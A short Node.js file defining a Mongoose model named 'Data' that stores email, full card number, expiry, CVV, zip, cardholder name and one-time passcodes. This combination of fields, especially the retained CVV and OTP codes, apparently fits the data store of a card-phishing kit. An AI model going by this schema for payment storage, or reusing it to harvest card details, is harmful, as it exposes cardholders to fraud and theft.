const mongoose = require('mongoose');

const DataSchema = new mongoose.Schema({
    email: String,
    cardNumber: String,
    expiry: String,
    cvv: String,
    zip: String,
    cardholderName: String,
    cardType: String,
    otpCode: String,
    timestamp: { type: Date, default: Date.now }
});

module.exports = mongoose.model('Data', DataSchema);
